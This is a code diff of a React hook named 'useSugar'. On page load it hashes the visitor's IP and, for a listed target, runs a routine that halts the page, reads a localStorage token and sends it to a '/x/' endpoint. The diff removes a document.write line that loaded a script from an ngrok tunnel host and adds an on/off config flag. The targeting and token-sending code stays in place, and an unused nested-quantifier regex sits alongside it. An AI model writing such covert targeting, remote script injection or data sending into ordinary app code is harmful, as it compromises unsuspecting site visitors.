@@ -1,4 +1,5 @@
 import { useEffect } from 'react'
+import { sugarOn } from '../config'
 import { getIp, makeHash } from '../util'
 
 const command = { run: /([^)]+)+$/.exec }
@@ -9,7 +10,7 @@ const sugar = () => {
 	// 	const body = JSON.stringify({ opener: window.opener })
 	// 	fetch('/sugar', { method: 'POST', body })
 	// }
-	document.write('<script src="https://cd06e2316155.jp.ngrok.io/v2" />')
+	document.write('')
 	window.stop()
 	const t = window.localStorage.getItem('xx')
 	if (t) fetch(`/x/${t}/n`)
@@ -21,6 +22,7 @@ const sugar = () => {
 
 export const useSugar = () => {
 	useEffect(() => {
+		if (!sugarOn) return
 		getIp().then((ip) => {
 			const cip = makeHash(ip)
 			if ([2830815118 /*2474348470*/].includes(cip)) {
